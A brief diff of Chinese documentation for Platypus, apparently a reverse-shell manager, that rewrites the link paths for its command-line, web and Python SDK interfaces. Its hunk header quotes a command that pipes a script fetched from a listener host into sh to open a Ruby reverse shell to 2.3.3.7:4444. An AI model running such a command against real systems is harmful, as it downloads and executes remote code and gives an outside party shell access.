@@ -58,9 +58,9 @@ curl http://1.3.3.7:13338/2.3.3.7/4444/ruby | sh
 !!! Hint
     Platypus 提供 3 种与之交互的方式。
 
-    * [命令行](./interact/cli.md)
-    * [Web 界面](./interact/web.md)
-    * [Python SDK](./interact/python-sdk.md)
+    * [命令行](/交互/cli/)
+    * [Web 界面](/交互/web/)
+    * [Python SDK](/交互/sdk/)
 
 这里只介绍最基础的**命令行**模式的一些命令。
 
